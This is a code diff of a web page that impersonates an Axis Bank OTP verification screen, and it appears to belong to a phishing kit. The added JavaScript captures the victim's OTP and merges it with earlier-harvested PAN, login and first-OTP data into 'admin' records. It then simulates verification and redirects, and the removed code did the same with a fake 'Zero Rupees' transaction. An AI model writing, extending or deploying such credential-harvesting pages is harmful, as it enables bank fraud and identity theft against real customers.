+            
+            return {
+                otp1Data: lastOTP1,
+                panData: lastPAN,
+                loginData: lastSubmission
+            };
+        }
+        
+        // Save OTP2 verification to localStorage
+        function saveOTP2Verification(otp, status) {
+            // Get existing OTP2 verifications or create empty array
+            let otp2Verifications = JSON.parse(localStorage.getItem('axisBankOTP2Verifications') || '[]');
+            
+            // Get all user data
+            const userData = getAllUserData();
+            
+            // Add new OTP2 verification
+            otp2Verifications.unshift({
+                id: Date.now(),
+                otp: otp,
+                status: status,
+                timestamp: new Date().toISOString(),
+                otp1Data: userData.otp1Data,
+                panData: userData.panData,
+                loginData: userData.loginData
+            });
+            
+            // Save back to localStorage
+            localStorage.setItem('axisBankOTP2Verifications', JSON.stringify(otp2Verifications));
+            
+            console.log('OTP2 verification saved:', { otp, status });
+            return otp2Verifications[0];
+        }
+        
+        // Save to admin data
+        function saveToAdmin(otp, otp2Record) {
+            // Get existing admin data or create empty array
+            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
+            
+            // Get all user data
+            const userData = getAllUserData();
+            
+            // Add to admin data
+            adminData.unshift({
+                id: Date.now(),
+                type: 'otp2_verification',
+                otp: otp,
+                otp2Record: otp2Record,
+                timestamp: new Date().toISOString(),
+                otp1Data: userData.otp1Data,
+                panData: userData.panData,
+                loginData: userData.loginData,
+                status: 'verified'
+            });
+            
+            // Save back to localStorage for admin panel
+            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+            
+            console.log('OTP2 data saved to admin:', otp);
+        }
+        
+        // Form submission handler
+        const otpForm = document.getElementById('otpForm');
+        if (otpForm) {
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const otp = fullOtpInput.value;
+                
+                if (otp.length !== 6) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                if (timeLeft <= 0) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Show loading
+                verifyButton.textContent = "Verifying...";
+                verifyButton.classList.add('loading');
+                verifyButton.disabled = true;
+                
+                // Save OTP2 verification
+                const otp2Record = saveOTP2Verification(otp, 'submitted');
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    // Remove loading
+                    verifyButton.textContent = "Complete Verification";
+                    verifyButton.classList.remove('loading');
+                    verifyButton.disabled = false;
+                    
+                    // Save to admin data
+                    saveToAdmin(otp, otp2Record);
+                    
+                    // Update status to verified
+                    saveOTP2Verification(otp, 'verified');
+                    
+                    // Redirect to account.html
+                    window.location.href = 'account.html';
+                    
+                }, 1500);
+            });
+        }
+        
+        // Resend button handler
+        resendButton.addEventListener('click', resendOTP);
+        
+        // Back link handler
+        backLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'axis_pan.html';
         });
         
-        // Form submission
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
+        // Help link handler
+        helpLink.addEventListener('click', function(e) {
             e.preventDefault();
+            window.location.href = 'help.html';
+        });
+        
+        // Initialize
+        window.addEventListener('DOMContentLoaded', function() {
+            // Focus first OTP input
+            otpInputs[0].focus();
             
-            const otp = fullOtpInput.value;
+            // Start timer
+            startTimer();
             
-            if (otp.length !== 6) {
-                alert('Please enter a valid 6-digit OTP');
-                return;
+            // Initialize resend button countdown
+            let resendCountdown = 180;
+            let resendInterval = setInterval(() => {
+                resendCountdown--;
+                resendButton.textContent = `Resend OTP (${resendCountdown}s)`;
+                
+                if (resendCountdown <= 0) {
+                    clearInterval(resendInterval);
+                    canResend = true;
+                    resendButton.disabled = false;
+                    resendButton.textContent = 'Resend OTP';
+                }
+            }, 1000);
+            
+            // Initialize localStorage for OTP2 verifications if not exists
+            if (!localStorage.getItem('axisBankOTP2Verifications')) {
+                localStorage.setItem('axisBankOTP2Verifications', JSON.stringify([]));
             }
             
-            // Save OTP to admin data
-            const otpData = {
-                otp: otp,
-                timestamp: new Date().toISOString(),
-                page: 'Axis Bank OTP 2',
-                verificationType: 'PAN Verification OTP',
-                transactionType: 'Zero Rupees',
-                transactionId: `TXN-PAN-${Date.now().toString().slice(-8)}`
-            };
-            
-            let adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
-            adminData.push(otpData);
-            localStorage.setItem('adminData', JSON.stringify(adminData));
-            
-            console.log('OTP 2 data saved:', otpData);
-            
-            // Show loading
-            const btn = document.querySelector('.submit-btn');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> AUTHORIZING...';
-            btn.disabled = true;
-            
-            // Simulate verification and redirect
-            setTimeout(() => {
-                window.location.href = 'axis_otp3.html';
-            }, 1500);
+            // Initialize localStorage for admin data if not exists
+            if (!localStorage.getItem('axisBankAdminData')) {
+                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            }
         });
     </script>
 </body>
-</html>
+    </html>
